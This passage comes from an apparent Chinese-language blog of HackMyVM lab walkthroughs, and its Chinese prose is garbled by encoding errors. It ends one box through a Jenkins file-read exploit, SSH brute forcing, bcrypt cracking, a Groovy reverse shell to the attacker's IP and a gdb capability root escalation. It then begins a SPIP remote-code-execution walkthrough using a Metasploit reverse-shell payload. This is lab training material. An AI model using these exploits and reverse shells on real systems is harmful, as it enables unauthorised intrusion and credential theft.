Nmap scan report for 192.168.205.217
Host is up (0.00040s latency).
Not shown: 65533 closed tcp ports (conn-refused)
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.6 (Ubuntu Linux; protocol 2.0)
8080/tcp open  http    Jetty 10.0.18
MAC Address: 08:00:27:75:04:B0 (Oracle VirtualBox virtual NIC)
Device type: general purpose
Running: Linux 4.X|5.X
OS CPE: cpe:/o:linux:linux_kernel:4 cpe:/o:linux:linux_kernel:5
OS details: Linux 4.15 - 5.8
Network Distance: 1 hop
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 12.23 seconds
                                                                 
```

Êâ´ÊèèÁªìÊûúÊòæÁ§∫ÁõÆÊ†áÊú∫Âô®ÂºÄÊîæ‰∫Ü 22 (SSH) „ÄÅ 80 (HTTP)„ÄÇ

## **2. Web ÊúçÂä°Êé¢Êµã‰∏é‰ªªÊÑèÊñá‰ª∂ËØªÂèñ**

ÂØπ 80 Á´ØÂè£ÊÑüÂÖ¥Ë∂£ÔºåËÆøÈóÆ Web È°µÈù¢„ÄÇËÆøÈóÆÊúâÁÇπÊÖ¢ÔºåÂèëÁé∞ÂÆÉÂú®Âä†ËΩΩ`192.168.5.32:8080`ÁöÑ‰∏úË•øÔºåÊàë‰ª¨ÂÖàÁªô‰ªñÁ¶Å‰∫Ü

![image](https://github.com/user-attachments/assets/cf4ca609-e74a-46f2-9298-addc5931cf52)

‰∏äÂéªÂú®peopleÁúãÂà∞Êúâ‰∏§‰∏™Áî®Êà∑Ôºå`anonymous`Âíå`an0ma1`

![image](https://github.com/user-attachments/assets/e794228c-5f00-417e-a444-4a99ff39139a)

&lt;div&gt;
&lt;br /&gt;
&lt;/div&gt;

Êâ´Êèè‰∏Ä‰∏ãÁ´ôÁÇπÁöÑÊû∂ÊûÑ

```bash
‚îå‚îÄ‚îÄ(kali„âøkali)-[~/test]
‚îî‚îÄ$ searchsploit Jenkins 2.441  
----------------------------------------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                                                       |  Path
----------------------------------------------------------------------------------------------------- ---------------------------------
Jenkins 2.441 - Local File Inclusion                                                                 | java/webapps/51993.py
----------------------------------------------------------------------------------------------------- ---------------------------------
Shellcodes: No Results

```

Êúâ‰∏Ä‰∏™‰ªªÊÑèÊñá‰ª∂ËØªÂèñÊºèÊ¥ûÔºå‰Ω†‰ª¨ÂèØ‰ª•Áî®Ëøô‰∏™POC‰ΩÜÊòØÊàëÊÑüËßâ[Ëøô‰∏™](https://github.com/godylockz/CVE-2024-23897)Êõ¥Â•ΩÁî®ÔºåÊàëÂ∞±Áî®Ëøô‰∏™‰∫Ü

```bash
‚îå‚îÄ‚îÄ(kali„âøkali)-[~/test]
‚îî‚îÄ$ git clone https://github.com/godylockz/CVE-2024-23897.git                     
Ê≠£ÂÖãÈöÜÂà∞ 'CVE-2024-23897'...
remote: Enumerating objects: 4, done.
remote: Counting objects: 100% (4/4), done.
remote: Compressing objects: 100% (4/4), done.
remote: Total 4 (delta 0), reused 4 (delta 0), pack-reused 0 (from 0)
Êé•Êî∂ÂØπË±°‰∏≠: 100% (4/4), ÂÆåÊàê.
                                                                                                                                     
‚îå‚îÄ‚îÄ(kali„âøkali)-[~/test]
‚îî‚îÄ$ cd CVE-2024-23897 
                                                                                                                                     
‚îå‚îÄ‚îÄ(kali„âøkali)-[~/test/CVE-2024-23897]
‚îî‚îÄ$ ls    
jenkins_fileread.py  README.md
                                     
‚îå‚îÄ‚îÄ(kali„âøkali)-[~/test/CVE-2024-23897]
‚îî‚îÄ$ python3 jenkins_fileread.py -u http://192.168.205.217:8080
Welcome to the Jenkins file-read shell. Type help or ? to list commands.

file&gt; /etc/passwd
messagebus:x:103:104::/nonexistent:/usr/sbin/nologin
dnsmasq:x:113:65534:dnsmasq,,,:/var/lib/misc:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
pollinate:x:105:1::/var/cache/pollinate:/bin/false
_apt:x:100:65534::/nonexistent:/usr/sbin/nologin
penetration:x:1001:1001::/home/penetration:/bin/bash
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
lxd:x:999:100::/var/snap/lxd/common/lxd:/bin/false
usbmux:x:112:46:usbmux daemon,,,:/var/lib/usbmux:/usr/sbin/nologin
irc:x:39:39:ircd:/run/ircd:/usr/sbin/nologin
tss:x:110:116:TPM software stack,,,:/var/lib/tpm:/bin/false
tcpdump:x:109:115::/nonexistent:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
sshd:x:106:65534::/run/sshd:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
landscape:x:111:117::/var/lib/landscape:/usr/sbin/nologin
kali:x:1000:1000:asd:/home/kali:/bin/bash
root:x:0:0:root:/root:/bin/bash
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
systemd-timesync:x:104:105:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
syslog:x:107:113::/home/syslog:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
systemd-network:x:101:102:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin
systemd-resolve:x:102:103:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin
uuidd:x:108:114::/run/uuidd:/usr/sbin/nologin
games:x:5:60:games:/usr/games:/usr/sbin/nologin
                      
```

Áî®Êà∑ÊòØ`kali`„ÄÅ`penetration`„ÄÅ`root`

ÁÑ∂ÂêéÊúâ‰∏§‰∏™**Áé©Ê≥ï**

### ÊñπÊ≥ï‰∏ÄÔºö

Áõ¥Êé•ÊãøÁî®Êà∑ÁàÜÁ†¥ssh

```bash
‚îå‚îÄ‚îÄ(kali„âøkali)-[~]
‚îî‚îÄ$ cat user                                                                                        
kali
penetration
root

‚îå‚îÄ‚îÄ(kali„âøkali)-[~]
‚îî‚îÄ$ hydra -L user -P /usr/share/wordlists/q5000.txt ssh://192.168.205.217 -f -t 64 
Hydra v9.5 (c) 2023 by van Hauser/THC &amp; David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2024-12-31 12:44:58
[WARNING] Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use -t 4
[WARNING] Restorefile (you have 10 seconds to abort... (use option -I to skip waiting)) from a previous session found, to prevent overwriting, ./hydra.restore
[DATA] max 64 tasks per 1 server, overall 64 tasks, 15000 login tries (l:3/p:5000), ~235 tries per task
[DATA] attacking ssh://192.168.205.217:22/
[22][ssh] host: 192.168.205.217   login: kali   password: asdfgh
[STATUS] attack finished for 192.168.205.217 (valid pair found)
1 of 1 target successfully completed, 1 valid password found
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2024-12-31 12:45:43

```

ÊãøÂà∞`kali`ÁöÑÂØÜÁ†ÅÁõ¥Êé•ÁôªÂΩïÔºå‰Ω†Â∞±‰ºöÂèëÁé∞`sudo`ÂèØ‰ª•Áõ¥Êé•ÊâßË°å‰ªªÊÑèËΩØ‰ª∂`bash -p`Â∞±ÊòØroot‰∫ÜÔºåËøôÁßçÂ∫îËØ•‰∏çÊòØÊ≠£Á°ÆÁöÑÊâìÂºÄÊñπÂºè„ÄÇ

### ÊñπÊ≥ï‰∫åÔºö

Êãø‰ªªÊÑèËØªÂèñËØªÁî®Êà∑Â∏êÊà∑ÂØÜÁ†ÅÁÑ∂Âêé‰ΩøÁî®`jenkins`ÂºπÂèçÂºπshellÔºå‰ΩÜÊòØ`jenkins`ÁöÑË∑ØÂæÑÊàëÊ≤°ÊúâÊâæÂà∞ÔºåÊàëÁ∫ØÂ±ûÈ©¨ÂêéÁÇÆÔºåÂìàÂìàÂìà

```bash
‚îå‚îÄ‚îÄ(kali„âøkali)-[~/test/CVE-2024-23897]
‚îî‚îÄ$ python3 jenkins_fileread.py -u http://192.168.205.217:8080\
Welcome to the Jenkins file-read shell. Type help or ? to list commands.

file&gt; /home/penetration/users/users.xml
File does not exist
file&gt; /home/penetration/.jenkins/users/users.xml
&lt;?xml version='1.1' encoding='UTF-8'?&gt;
  &lt;idToDirectoryNameMap class=
    &lt;entry&gt;
      &lt;string&gt;an0ma1_6703692303677686036&lt;/string&gt;
  &lt;version&gt;1&lt;/version&gt;
      &lt;string&gt;an0ma1&lt;/string&gt;
&lt;/hudson.model.UserIdMapper&gt;
  &lt;/idToDirectoryNameMap&gt;
&lt;hudson.model.UserIdMapper&gt;
    &lt;/entry&gt;
file&gt; /home/penetration/.jenkins/users/an0ma1_6703692303677686036/config.xml
&lt;hudson.search.UserSearchProperty&gt;
      &lt;roles&gt;
    &lt;jenkins.security.seed.UserSeedProperty&gt;
    &lt;/hudson.search.UserSearchProperty&gt;
      &lt;/tokenStore&gt;
  &lt;properties&gt;
      &lt;flags/&gt;
    &lt;jenkins.security.LastGrantedAuthoritiesProperty&gt;
    &lt;hudson.model.MyViewsProperty&gt;
&lt;/user&gt;
  &lt;id&gt;an0ma1&lt;/id&gt;
    &lt;/jenkins.security.ApiTokenProperty&gt;
      &lt;views&gt;
    &lt;org.jenkinsci.plugins.displayurlapi.user.PreferredProviderUserProperty plugin=
        &lt;string&gt;authenticated&lt;/string&gt;
&lt;user&gt;
          &lt;name&gt;all&lt;/name&gt;
      &lt;collapsed/&gt;
    &lt;/jenkins.security.seed.UserSeedProperty&gt;
    &lt;com.cloudbees.plugins.credentials.UserCredentialsProvider_-UserCredentialsProperty plugin=
    &lt;/org.jenkinsci.plugins.displayurlapi.user.PreferredProviderUserProperty&gt;
    &lt;/hudson.model.MyViewsProperty&gt;
      &lt;domainCredentialsMap class=
      &lt;triggers/&gt;
          &lt;filterQueue&gt;false&lt;/filterQueue&gt;
      &lt;passwordHash&gt;#jbcrypt:$2a$10$3Ms0ektq3Nt8FBV8WeISb.Y.Xh81/VsOhZAhn5xhXzTZEFlsmGm76&lt;/passwordHash&gt;
      &lt;/views&gt;
    &lt;jenkins.security.ApiTokenProperty&gt;
    &lt;/hudson.model.PaneStatusProperties&gt;
    &lt;/hudson.tasks.Mailer_-UserProperty&gt;
      &lt;emailAddress&gt;1594743209@qq.com&lt;/emailAddress&gt;
    &lt;jenkins.console.ConsoleUrlProviderUserProperty/&gt;
        &lt;tokenList/&gt;
        &lt;/hudson.model.AllView&gt;
    &lt;/hudson.plugins.emailext.watching.EmailExtWatchAction_-UserProperty&gt;
          &lt;owner class=
  &lt;/properties&gt;
      &lt;timestamp&gt;1712972655377&lt;/timestamp&gt;
    &lt;hudson.model.TimeZoneProperty/&gt;
    &lt;/jenkins.model.experimentalflags.UserExperimentalFlagsProperty&gt;
    &lt;/com.cloudbees.plugins.credentials.UserCredentialsProvider_-UserCredentialsProperty&gt;
      &lt;insensitiveSearch&gt;true&lt;/insensitiveSearch&gt;
    &lt;hudson.security.HudsonPrivateSecurityRealm_-Details&gt;
          &lt;properties class=
        &lt;hudson.model.AllView&gt;
    &lt;/hudson.security.HudsonPrivateSecurityRealm_-Details&gt;
      &lt;seed&gt;e9885566be638620&lt;/seed&gt;
      &lt;providerId&gt;default&lt;/providerId&gt;
    &lt;jenkins.model.experimentalflags.UserExperimentalFlagsProperty&gt;
      &lt;/roles&gt;
    &lt;/jenkins.security.LastGrantedAuthoritiesProperty&gt;
    &lt;hudson.model.PaneStatusProperties&gt;
    &lt;hudson.plugins.emailext.watching.EmailExtWatchAction_-UserProperty plugin=
&lt;?xml version='1.1' encoding='UTF-8'?&gt;
  &lt;version&gt;10&lt;/version&gt;
    &lt;hudson.tasks.Mailer_-UserProperty plugin=
          &lt;filterExecutors&gt;false&lt;/filterExecutors&gt;
      &lt;tokenStore&gt;
    &lt;io.jenkins.plugins.thememanager.ThemeUserProperty plugin=
  &lt;fullName&gt;Mike&lt;/fullName&gt;

```

`#jbcrypt:10$3Ms0ektq3Nt8FBV8WeISb.Y.Xh81/VsOhZAhn5xhXzTZEFlsmGm76`Áî®Êà∑ÁöÑhashÔºåÁ†¥Ëß£‰∏Ä‰∏ã

```bash
‚îå‚îÄ‚îÄ(kali„âøkali)-[~/test/CVE-2024-23897]
‚îî‚îÄ$ echo '$2a$10$3Ms0ektq3Nt8FBV8WeISb.Y.Xh81/VsOhZAhn5xhXzTZEFlsmGm76' &gt; hash                                  
                                                                                                                                     
‚îå‚îÄ‚îÄ(kali„âøkali)-[~/test/CVE-2024-23897]
‚îî‚îÄ$ hashcat -a 0 -m 3200 hash /usr/share/wordlists/rockyou.txt
hashcat (v6.2.6) starting

OpenCL API (OpenCL 3.0 PoCL 6.0+debian  Linux, None+Asserts, RELOC, LLVM 17.0.6, SLEEF, DISTRO, POCL_DEBUG) - Platform #1 [The pocl project]
============================================================================================================================================
* Device #1: cpu-skylake-avx512-AMD Ryzen 9 7940H w/ Radeon 780M Graphics, 6925/13914 MB (2048 MB allocatable), 12MCU

Minimum password length supported by kernel: 0
Maximum password length supported by kernel: 72

Hashes: 1 digests; 1 unique digests, 1 unique salts
Bitmaps: 16 bits, 65536 entries, 0x0000ffff mask, 262144 bytes, 5/13 rotates
Rules: 1

Optimizers applied:
* Zero-Byte
* Single-Hash
* Single-Salt

Watchdog: Temperature abort trigger set to 90c

Host memory required for this attack: 0 MB

Dictionary cache hit:
* Filename..: /usr/share/wordlists/rockyou.txt
* Passwords.: 14344385
* Bytes.....: 139921507
* Keyspace..: 14344385

Cracking performance lower than expected?               

* Append -w 3 to the commandline.
  This can cause your screen to lag.

* Append -S to the commandline.
  This has a drastic speed impact but can be better for specific attacks.
  Typical scenarios are a small wordlist but a large ruleset.

* Update your backend API runtime / driver the right way:
  https://hashcat.net/faq/wrongdriver

* Create more work items to make use of your parallelization power:
  https://hashcat.net/faq/morework

$2a$10$3Ms0ektq3Nt8FBV8WeISb.Y.Xh81/VsOhZAhn5xhXzTZEFlsmGm76:369258
                                                        
Session..........: hashcat
Status...........: Cracked
Hash.Mode........: 3200 (bcrypt $2*$, Blowfish (Unix))
Hash.Target......: $2a$10$3Ms0ektq3Nt8FBV8WeISb.Y.Xh81/VsOhZAhn5xhXzTZ...smGm76
Time.Started.....: Tue Dec 31 12:59:17 2024 (30 secs)
Time.Estimated...: Tue Dec 31 12:59:47 2024 (0 secs)
Kernel.Feature...: Pure Kernel
Guess.Base.......: File (/usr/share/wordlists/rockyou.txt)
Guess.Queue......: 1/1 (100.00%)
Speed.#1.........:      172 H/s (7.45ms) @ Accel:12 Loops:8 Thr:1 Vec:1
Recovered........: 1/1 (100.00%) Digests (total), 1/1 (100.00%) Digests (new)
Progress.........: 5040/14344385 (0.04%)
Rejected.........: 0/5040 (0.00%)
Restore.Point....: 4896/14344385 (0.03%)
Restore.Sub.#1...: Salt:0 Amplifier:0-1 Iteration:1016-1024
Candidate.Engine.: Device Generator
Candidates.#1....: FUCKYOU -&gt; twisted
Hardware.Mon.#1..: Util: 75%

Started: Tue Dec 31 12:59:13 2024
Stopped: Tue Dec 31 12:59:49 2024
                                                         
```

ÁÑ∂ÂêéÁôª‰∏äÂéªÂºπ‰∏™shellÂõûÊù•

Manage Jenkins --&gt; Script Console

GroovyÁöÑÂèçÂºπshellÔºåÊàëÁöÑÊòØËøôÊ†∑ÁöÑ

```bash
String host='192.168.205.141';int port=8888;String cmd='bash';Process p=new ProcessBuilder(cmd).redirectErrorStream(true).start();Socket s=new Socket(host,port);InputStream pi=p.getInputStream(),pe=p.getErrorStream(), si=s.getInputStream();OutputStream po=p.getOutputStream(),so=s.getOutputStream();while(!s.isClosed()){while(pi.available()&gt;0)so.write(pi.read());while(pe.available()&gt;0)so.write(pe.read());while(si.available()&gt;0)po.write(si.read());so.flush();po.flush();Thread.sleep(50);try {p.exitValue();break;}catch (Exception e){}};p.destroy();s.close();
```

ÂõûÊù•‰∫Ü

```bash
‚îå‚îÄ‚îÄ(kali„âøkali)-[~/test/CVE-2024-23897]
‚îî‚îÄ$ nc -lvnp 8888        
listening on [any] 8888 ...
connect to [192.168.205.141] from (UNKNOWN) [192.168.205.217] 51832
id
uid=1001(penetration) gid=1001(penetration) groups=1001(penetration)

```

## 3.**Ëé∑ÂæóÁ®≥ÂÆö shell**

Ëé∑Âæó‰∫§‰∫íÂºè TTY shellÔºö

```bash
script /dev/null -c bash  
ctrl+z  
stty raw -echo; fg  
reset xterm  
export TERM=xterm  
echo $SHELL  
export SHELL=/bin/bash  
stty rows 59 cols 236
```

## 4.ÊèêÂèñ

```bash
penetration@asd:/opt$ id
uid=1001(penetration) gid=1001(penetration) groups=1001(penetration)
penetration@asd:/opt$ sudo -l
Matching Defaults entries for penetration on asd:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, use_pty

User penetration may run the following commands on asd:
    (ALL) NOPASSWD: /opt/babyGift/vuln

penetration@asd:/opt$ /sbin/getcap -r / 2&gt;/dev/null
/snap/core20/2264/usr/bin/ping cap_net_raw=ep
/snap/core20/2434/usr/bin/ping cap_net_raw=ep
/usr/bin/ping cap_net_raw=ep
/usr/bin/mtr-packet cap_net_raw=ep
/usr/bin/gdb cap_setuid=ep
/usr/lib/x86_64-linux-gnu/gstreamer1.0/gstreamer-1.0/gst-ptp-helper cap_net_bind_service,cap_net_admin=ep

```

Êúâ‰∏™`/usr/bin/gdb cap_setuid=ep`ÂèØ‰ª•`Capabilities`ÂèØ‰ª•Âà©Áî®

![image](https://github.com/user-attachments/assets/c8a29b20-614e-42b1-a4a0-9ddce4ec068d)

```bash
penetration@asd:/opt$ /usr/bin/gdb -nx -ex 'python import os; os.setuid(0)' -ex '!sh' -ex quit
GNU gdb (Ubuntu 13.1-2ubuntu2.1) 13.1
Copyright (C) 2023 Free Software Foundation, Inc.
License GPLv3+: GNU GPL version 3 or later &lt;http://gnu.org/licenses/gpl.html&gt;
This is free software: you are free to change and redistribute it.
There is NO WARRANTY, to the extent permitted by law.
Type 'show copying' and 'show warranty' for details.
This GDB was configured as 'x86_64-linux-gnu'.
Type 'show configuration' for configuration details.
For bug reporting instructions, please see:
&lt;https://www.gnu.org/software/gdb/bugs/&gt;.
Find the GDB manual and other documentation resources online at:
    &lt;http://www.gnu.org/software/gdb/documentation/&gt;.

For help, type 'help'.
Type 'apropos word' to search for commands related to 'word'.
# id
uid=0(root) gid=1001(penetration) groups=1001(penetration)
```sentence</description><guid isPermaLink="true">https://7r1UMPHK.github.io/post/hmv_qweasd.html</guid><pubDate>Fri, 27 Jun 2025 09:33:36 +0000</pubDate></item><item><title>hmv_publisher</title><link>https://7r1UMPHK.github.io/post/hmv_publisher.html</link><description># hmv_publisher

**Èù∂Êú∫**Ôºöhttps://hackmyvm.eu/machines/machine.php?vm=Leet
**ÈöæÂ∫¶**ÔºöÁªøËâ≤
**ÁõÆÊ†á IP**Ôºö192.168.205.211
**Êú¨Êú∫** IPÔºö192.168.205.141

---

### **1. Á´ØÂè£Êûö‰∏æÂèäÊúçÂä°Êé¢Êµã**

È¶ñÂÖàÔºå‰ΩøÁî® `nmap` Êâ´ÊèèÁõÆÊ†á IP ÁöÑÂºÄÊîæÁ´ØÂè£ÔºåÂëΩ‰ª§Â¶Ç‰∏ãÔºö

```bash
‚îå‚îÄ‚îÄ(kali„âøkali)-[~/test]
‚îî‚îÄ$ nmap -sV -sT -O -Pn -n -p- 192.168.205.211
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-12-29 11:31 CST
Nmap scan report for 192.168.205.211
Host is up (0.0012s latency).
Not shown: 65533 closed tcp ports (conn-refused)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.10 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
MAC Address: 08:00:27:D4:4E:10 (Oracle VirtualBox virtual NIC)
Device type: general purpose
Running: Linux 4.X|5.X
OS CPE: cpe:/o:linux:linux_kernel:4 cpe:/o:linux:linux_kernel:5
OS details: Linux 4.15 - 5.8
Network Distance: 1 hop
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 9.99 seconds
```

Êâ´ÊèèÁªìÊûúÊòæÁ§∫ÁõÆÊ†áÊú∫Âô®ÂºÄÊîæ‰∫Ü 22 (SSH) Âíå 80 (HTTP) Á´ØÂè£„ÄÇ

---

### **2. Web ÊúçÂä°Êé¢Êµã‰∏éÁõÆÂΩïÁàÜÁ†¥**

ÂØπ 80 Á´ØÂè£ÊÑüÂÖ¥Ë∂£ÔºåËÆøÈóÆ Web È°µÈù¢ÔºåÂèëÁé∞ÂÖ∂ÊòØ‰∏Ä‰∏™ÈùôÊÄÅÈ°µÈù¢ÔºåÂåÖÂê´Â§ö‰∏™ÈîöÁÇπ„ÄÇ‰ΩøÁî® `whatweb` Êé¢ÊµãÔºö

```bash
‚îå‚îÄ‚îÄ(kali„âøkali)-[~/test]
‚îî‚îÄ$ whatweb http://192.168.205.211/   
http://192.168.205.211/ [200 OK] Apache[2.4.41], Country[RESERVED][ZZ], HTTPServer[Ubuntu Linux][Apache/2.4.41 (Ubuntu)], IP[192.168.205.211], Title[Publisher's Pulse: SPIP Insights &amp; Tips]
```

ÂçïÁ∫ØÈùôÊÄÅÈ°µÔºåÁõÆÂΩïÁàÜÁ†¥Âêß„ÄÇ

‰ΩøÁî® `gobuster` ËøõË°åÁõÆÂΩïÁàÜÁ†¥Ôºö

```bash
‚îå‚îÄ‚îÄ(kali„âøkali)-[~/test]
‚îî‚îÄ$ gobuster dir -u http://192.168.205.211/ -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-big.txt -x php,html,txt,md -b 404 
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) &amp; Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://192.168.205.211/
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-big.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Extensions:              php,html,txt,md
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/.php                 (Status: 403) [Size: 280]
/.html                (Status: 403) [Size: 280]
/images               (Status: 301) [Size: 319] [--&gt; http://192.168.205.211/images/]
/index.html           (Status: 200) [Size: 8686]
/spip                 (Status: 301) [Size: 317] [--&gt; http://192.168.205.211/spip/]
/.html                (Status: 403) [Size: 280]
/.php                 (Status: 403) [Size: 280]
/server-status        (Status: 403) [Size: 280]
Progress: 2314636 / 6369165 (36.34%)^C
[!] Keyboard interrupt detected, terminating.
Progress: 2319486 / 6369165 (36.42%)
===============================================================
Finished
===============================================================
                                                          
```

ÁàÜÁ†¥ÁªìÊûúÊòæÁ§∫ `/images` Âíå `/spip` ÁõÆÂΩïÂ≠òÂú®ÔºåÂπ∂‰∏î `/spip/` ÁúãËµ∑Êù•ÊòØ‰∏™ÊÑüÂÖ¥Ë∂£ÁöÑÁõÆÊ†á„ÄÇ

---

### **3. Âà©Áî® SPIP ËøúÁ®ã‰ª£Á†ÅÊâßË°åÊºèÊ¥û**

ËÆøÈóÆ `http://192.168.205.211/spip/`

![image](https://github.com/user-attachments/assets/9846af83-d63f-4888-9de4-c9607030cbd3)

‰ΩøÁî® `whatweb` Êé¢Êµã

```bash
‚îå‚îÄ‚îÄ(kali„âøkali)-[~/test]
‚îî‚îÄ$ whatweb http://192.168.205.211/spip/   
http://192.168.205.211/spip/ [200 OK] Apache[2.4.41], Country[RESERVED][ZZ], HTML5, HTTPServer[Ubuntu Linux][Apache/2.4.41 (Ubuntu)], IP[192.168.205.211], MetaGenerator[SPIP 4.2.0], SPIP[4.2.0][http://192.168.205.211/spip/local/config.txt], Script[text/javascript], Title[Publisher], UncommonHeaders[composed-by,link,x-spip-cache]

```

‰ΩøÁî® `searchsploit` Êü•ÊâæÁõ∏ÂÖ≥ÁöÑÊºèÊ¥ûÂà©Áî®ËÑöÊú¨Ôºö

```bash
‚îå‚îÄ‚îÄ(kali„âøkali)-[~/test]
‚îî‚îÄ$ searchsploit SPIP 4.2.0                                                                                  
----------------------------------------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                                                       |  Path
----------------------------------------------------------------------------------------------------- ---------------------------------
SPIP v4.2.0 - Remote Code Execution (Unauthenticated)                                                | php/webapps/51536.py
----------------------------------------------------------------------------------------------------- ---------------------------------
Shellcodes: No Results
                      
```

ÊâæÂà∞‰∏Ä‰∏™ËøúÁ®ã‰ª£Á†ÅÊâßË°åÊºèÊ¥û (`SPIP v4.2.0 - Remote Code Execution (Unauthenticated)`),Âà©Áî®‰∏Ä‰∏ã

```bash
‚îå‚îÄ‚îÄ(kali„âøkali)-[~/test]
‚îî‚îÄ$ python3 51536.py 
usage: 51536.py [-h] -u URL -c COMMAND [-v]
51536.py: error: the following arguments are required: -u/--url, -c/--command
                                                                                                                                 
‚îå‚îÄ‚îÄ(kali„âøkali)-[~/test]
‚îî‚îÄ$ python3 51536.py -u http://192.168.205.211/spip/ -c id
Traceback (most recent call last):
  File '/home/kali/test/51536.py', line 63, in &lt;module&gt;
    requests.packages.urllib3.util.ssl_.DEFAULT_CIPHERS += ':HIGH:!DH:!aNULL'
    ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
AttributeError: module 'urllib3.util.ssl_' has no attribute 'DEFAULT_CIPHERS'
```

Êä•ÈîôÔºåÊç¢ Metasploit Âà©Áî®ËØ•ÊºèÊ¥ûÔºö

```bash
msfconsole
msf6 &gt; search SPIP 4.2

Matching Modules
================

   #   Name                                             Disclosure Date  Rank       Check  Description
   -   ----                                             ---------------  ----       -----  -----------
   0   exploit/multi/http/spip_bigup_unauth_rce         2024-09-06       excellent  Yes    SPIP BigUp Plugin Unauthenticated RCE
   1     \_ target: PHP In-Memory                       .                .          .      .
   2     \_ target: Unix/Linux Command Shell            .                .          .      .
   3     \_ target: Windows Command Shell               .                .          .      .
   4   exploit/multi/http/spip_porte_plume_previsu_rce  2024-08-16       excellent  Yes    SPIP Unauthenticated RCE via porte_plume Plugin
   5     \_ target: PHP In-Memory                       .                .          .      .
   6     \_ target: Unix/Linux Command Shell            .                .          .      .
   7     \_ target: Windows Command Shell               .                .          .      .
   8   exploit/multi/http/spip_rce_form                 2023-02-27       excellent  Yes    SPIP form PHP Injection
   9     \_ target: PHP In-Memory                       .                .          .      .
   10    \_ target: Unix/Linux Command Shell            .                .          .      .
   11    \_ target: Windows Command Shell               .                .          .      .


Interact with a module by name or index. For example info 11, use 11 or use exploit/multi/http/spip_rce_form
After interacting with a module you can manually set a TARGET with set TARGET 'Windows Command Shell'

msf6 &gt; use 0
[*] No payload configured, defaulting to php/meterpreter/reverse_tcp
msf6 exploit(multi/http/spip_bigup_unauth_rce) &gt; show options 

Module options (exploit/multi/http/spip_bigup_unauth_rce):

   Name       Current Setting  Required  Description
   ----       ---------------  --------  -----------
   FORM_PAGE  Auto             yes       A page with a form.
   Proxies                     no        A proxy chain of format type:host:port[,type:host:port][...]
   RHOSTS                      yes       The target host(s), see https://docs.metasploit.com/docs/using-metasploit/basics/using-metas
                                         ploit.html
   RPORT      80               yes       The target port (TCP)
   SSL        false            no        Negotiate SSL/TLS for outgoing connections
   TARGETURI  /                yes       Path to Spip install
   VHOST                       no        HTTP server virtual host


Payload options (php/meterpreter/reverse_tcp):

   Name   Current Setting  Required  Description
   ----   ---------------  --------  -----------
   LHOST  192.168.205.141  yes       The listen address (an interface may be specified)
   LPORT  4444             yes       The listen port


Exploit target:

   Id  Name
   --  ----
   0   PHP In-Memory



View the full module info with the info, or info -d command.

msf6 exploit(multi/http/spip_bigup_unauth_rce) &gt; set RHOSTS http://192.168.205.211/spip/
RHOSTS =&gt; http://192.168.205.211/spip/
msf6 exploit(multi/http/spip_bigup_unauth_rce) &gt; run

[*] Started reverse TCP handler on 192.168.205.141:4444 
[*] Running automatic check ('set AutoCheck false' to disable)
[*] SPIP Version detected: 4.2.0
[+] SPIP version 4.2.0 is vulnerable.
[*] Bigup plugin version detected: 3.2.1
[+] The target appears to be vulnerable. Both the detected SPIP version (4.2.0) and bigup version (3.2.1) are vulnerable.
[*] Found formulaire_action: login
[*] Found formulaire_action_args: CKNCtIY6q36vgXbnqHlnO...
[*] Preparing to send exploit payload to the target...
[*] Sending stage (40004 bytes) to 192.168.205.211
[*] Meterpreter session 1 opened (192.168.205.141:4444 -&gt; 192.168.205.211:44672) at 2024-12-29 12:41:44 +0800

meterpreter &gt; shell
Process 52 created.
Channel 0 created.
id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

ÊàêÂäüËé∑Âæó Meterpreter shell

---

### **4. Ëé∑ÂæóÊõ¥Á®≥ÂÆöÁöÑ shell**

